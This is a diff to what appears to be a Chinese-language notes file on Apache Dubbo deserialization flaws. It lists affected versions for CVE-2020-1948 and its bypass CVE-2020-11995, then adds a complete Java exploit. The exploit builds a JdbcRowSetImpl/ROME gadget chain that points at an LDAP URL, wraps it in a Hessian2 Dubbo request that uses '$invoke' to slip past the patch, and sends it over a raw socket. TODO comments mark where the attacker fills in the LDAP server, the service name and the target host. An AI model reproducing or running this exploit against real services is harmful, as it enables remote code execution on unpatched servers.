@@ -10,6 +10,122 @@ http://www.lmxspace.com/2020/02/16/Apache-Dubbo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C
 
 https://www.mi1k7ea.com/2021/07/03/%E6%B5%85%E6%9E%90Dubbo-HttpInvokerServiceExporter%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2019-17564%EF%BC%89/
 
+### CVE-2020-1948
+https://www.anquanke.com/post/id/209251
+```
+2.7.0 <= Dubbo Version <= 2.7.6
+2.6.0 <= Dubbo Version <= 2.6.7
+Dubbo 所有 2.5.x 版本（官方团队目前已不支持）
+```
+
+### CVE-2020-11995
+
+CVE-2020-1948的绕过
+
+```
+Dubbo 2.7.0 ~ 2.7.8
+Dubbo 2.6.0 ~ 2.6.8
+Dubbo 所有 2.5.x 版本
+```
+
+```java
+import com.rometools.rome.feed.impl.EqualsBean;
+import com.rometools.rome.feed.impl.ToStringBean;
+import com.sun.rowset.JdbcRowSetImpl;
+import java.io.ByteArrayOutputStream;
+import java.io.OutputStream;
+import java.lang.reflect.Array;
+import java.lang.reflect.Constructor;
+import java.net.Socket;
+import java.util.HashMap;
+import java.util.Random;
+import marshalsec.util.Reflections;
+import org.apache.dubbo.common.io.Bytes;
+import org.apache.dubbo.common.serialize.Cleanable;
+import org.apache.dubbo.common.serialize.hessian2.Hessian2ObjectOutput;
+
+/**
+ *  CVE-2020-1948 exp
+ *  if (!RpcUtils.isGenericCall(path, getMethodName()) && !RpcUtils.isEcho(path, getMethodName())) {
+ *       throw new IllegalArgumentException("Service not found:" + path + ", " + getMethodName());
+ *  }
+ * 下面有绕过CVE-2020-11995
+ * 调用的函数名为 "$invoke"、 "$invokeAsync"、"$echo"三者之一
+ */
+public class GadgetsTestHessian {
+
+    public static void main(String[] args) throws Exception {
+        JdbcRowSetImpl rs = new JdbcRowSetImpl();
+        //todo 此处填写ldap url
+        rs.setDataSourceName("ldap://127.0.0.1:43658/ExecObject");
+        rs.setMatchColumn("foo");
+        Reflections.getField(javax.sql.rowset.BaseRowSet.class, "listeners").set(rs, null);
+
+        ToStringBean item = new ToStringBean(JdbcRowSetImpl.class, rs);
+        EqualsBean root = new EqualsBean(ToStringBean.class, item);
+
+        HashMap s = new HashMap<>();
+        Reflections.setFieldValue(s, "size", 2);
+        Class<?> nodeC;
+        try {
+            nodeC = Class.forName("java.util.HashMap$Node");
+        }
+        catch ( ClassNotFoundException e ) {
+            nodeC = Class.forName("java.util.HashMap$Entry");
+        }
+        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
+        nodeCons.setAccessible(true);
+
+        Object tbl = Array.newInstance(nodeC, 2);
+        Array.set(tbl, 0, nodeCons.newInstance(0, root, root, null));
+        Array.set(tbl, 1, nodeCons.newInstance(0, root, root, null));
+        Reflections.setFieldValue(s, "table", tbl);
+
+        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
+
+        // header.
+        byte[] header = new byte[16];
+        // set magic number.
+        Bytes.short2bytes((short) 0xdabb, header);
+        // set request and serialization flag.
+        header[2] = (byte) ((byte) 0x80 | 2);
+
+        // set request id.
+        Bytes.long2bytes(new Random().nextInt(100000000), header, 4);
+
+        ByteArrayOutputStream hessian2ByteArrayOutputStream = new ByteArrayOutputStream();
+        Hessian2ObjectOutput out = new Hessian2ObjectOutput(hessian2ByteArrayOutputStream);
+
+        out.writeUTF("2.0.2");
+        //todo 此处填写注册中心获取到的service全限定名、版本号、方法名
+        out.writeUTF("com.threedr3am.learn.server.boot.DemoService");
+        out.writeUTF("1.0");
+        out.writeUTF("$invoke");//CVE-2020-11995  $invoke,$invokeAsync,$echo
+        //todo 方法描述不需要修改，因为此处需要指定map的payload去触发
+        out.writeUTF("Ljava/util/Map;");
+        out.writeObject(s);
+        out.writeObject(new HashMap());
+
+        out.flushBuffer();
+        if (out instanceof Cleanable) {
+            ((Cleanable) out).cleanup();
+        }
+
+        Bytes.int2bytes(hessian2ByteArrayOutputStream.size(), header, 12);
+        byteArrayOutputStream.write(header);
+        byteArrayOutputStream.write(hessian2ByteArrayOutputStream.toByteArray());
+
+        byte[] bytes = byteArrayOutputStream.toByteArray();
+
+//todo 此处填写被攻击的dubbo服务提供者地址和端口
+        Socket socket = new Socket("127.0.0.1", 12345);
+        OutputStream outputStream = socket.getOutputStream();
+        outputStream.write(bytes);
+        outputStream.flush();
+        outputStream.close();
+    }
+}
+```
 ### CVE-2021-25641
 >Dubbo Provider即服务提供方默认使用dubbo协议来进行RPC通信，而dubbo协议默认是使用Hessian2序列化格式进行对象传输的,不过可以通过更改dubbo协议的第三个flag位字节来更改为使用Kryo或FST序列化格式来进行Dubbo Provider反序列化攻击从而绕过针对Hessian2反序列化相关的限制来达到RCE。
 
